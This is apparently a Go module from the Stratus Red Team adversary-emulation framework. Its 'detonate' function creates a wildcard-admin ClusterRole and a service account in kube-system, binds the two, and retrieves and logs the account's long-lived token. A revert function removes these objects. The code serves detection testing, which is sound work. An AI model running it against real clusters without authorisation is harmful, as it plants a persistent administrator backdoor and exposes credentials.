package kubernetes

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/smithy-go/ptr"
	corev1 "k8s.io/api/core/v1"
	rbacv1 "k8s.io/api/rbac/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/wait"
	"log"
	"time"

	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
)

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.persistence.create-admin-clusterrole",
		FriendlyName:       "Create Admin ClusterRole",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       false,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		Description: `
Creates a Service Account bound to a cluster administrator role.

Warm-up: None

Detonation: 

- Create a Cluster Role with administrative permissions
- Create a Service Account (in the ` + namespace + ` namespace)
- Create a Cluster Role Binding
- Retrieve the long-lived service account token, stored by K8s in a secret
`,
		Detonate: detonate,
		Revert:   revert,
	})
}

// Namespace to create the service account in
const namespace = "kube-system"

var all = []string{"*"}

var clusterRole = &rbacv1.ClusterRole{
	ObjectMeta: metav1.ObjectMeta{Name: "stratus-red-team-clusterrole"},
	Rules:      []rbacv1.PolicyRule{{Verbs: all, APIGroups: all, Resources: all}},
}

var serviceAccount = &corev1.ServiceAccount{
	ObjectMeta:                   metav1.ObjectMeta{Name: "stratus-red-team-serviceaccount"},
	AutomountServiceAccountToken: ptr.Bool(true),
}

var clusterRoleBinding = &rbacv1.ClusterRoleBinding{
	ObjectMeta: metav1.ObjectMeta{Name: "stratus-red-team-crb"},
	Subjects:   []rbacv1.Subject{{Kind: rbacv1.ServiceAccountKind, Name: serviceAccount.Name, Namespace: namespace}},
	RoleRef:    rbacv1.RoleRef{Kind: "ClusterRole", Name: clusterRole.Name},
}

func detonate(map[string]string) error {
	client := providers.K8s().GetClient()
	ctx := context.Background()

	log.Println("Creating Cluster Role " + clusterRole.ObjectMeta.Name)
	_, err := client.RbacV1().ClusterRoles().Create(ctx, clusterRole, metav1.CreateOptions{})
	if err != nil {
		return errors.New("unable to create ClusterRole: " + err.Error())
	}

	log.Println("Creating Service Account " + serviceAccount.Name)
	_, err = client.CoreV1().ServiceAccounts(namespace).Create(ctx, serviceAccount, metav1.CreateOptions{})
	if err != nil {
		return errors.New("unable to create ServiceAccount: " + err.Error())
	}

	log.Println("Creating Cluster Role Binding to map the service account to the cluster role")
	_, err = client.RbacV1().ClusterRoleBindings().Create(ctx, clusterRoleBinding, metav1.CreateOptions{})
	if err != nil {
		return errors.New("unable to create ClusterRoleBinding: " + err.Error())
	}

	log.Println("Finding secret associated to the newly created service account")
	// We need to wait for the ServiceAccount to have been picked up by the Secret Controller
	// watching service account creation and provisioning secrets for them
	// see https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/#token-controller
	var secretName string
	err = wait.PollImmediate(1*time.Second, 1*time.Minute, func() (done bool, err error) {
		name, err := getServiceAccountSecretName()
		secretName = name
		return name != "", err
	})
	if err != nil {
		return errors.New("unable to find the associated secret: " + err.Error())
	}

	log.Println("Stealing permanent service account token for this service account")
	tokenSecret, err := client.CoreV1().Secrets(namespace).Get(ctx, secretName, metav1.GetOptions{})
	if err != nil {
		return errors.New("unable to retrieve the service account token: " + err.Error())
	}

	token := string(tokenSecret.Data["token"])
	log.Println("Successfully retrieved the service account token: \n\n" + token)
	return nil
}

// Returns the name of the K8s secret containing the long-lived service account token
func getServiceAccountSecretName() (string, error) {
	client := providers.K8s().GetClient()
	serviceAccount, err := client.CoreV1().ServiceAccounts(namespace).Get(context.Background(), serviceAccount.Name, metav1.GetOptions{})
	if err != nil {
		return "", err
	}
	if len(serviceAccount.Secrets) > 0 {
		return serviceAccount.Secrets[0].Name, nil
	}
	return "", nil
}

func revert(map[string]string) error {
	client := providers.K8s().GetClient()
	roleName := clusterRole.Name
	deleteOpts := metav1.DeleteOptions{GracePeriodSeconds: ptr.Int64(0)}

	log.Println("Deleting ClusterRole " + roleName)
	err := client.RbacV1().ClusterRoles().Delete(context.Background(), roleName, deleteOpts)
	if err != nil {
		return errors.New("unable to remove ClusterRole " + err.Error())
	}

	err = client.CoreV1().ServiceAccounts(namespace).Delete(context.Background(), serviceAccount.Name, deleteOpts)
	if err != nil {
		return errors.New("unable to remove ServiceAccount " + err.Error())
	}

	err = client.RbacV1().ClusterRoleBindings().Delete(context.Background(), clusterRoleBinding.Name, deleteOpts)
	if err != nil {
		return errors.New("unable to remove ClusterRoleBinding: " + err.Error())
	}

	return nil
}
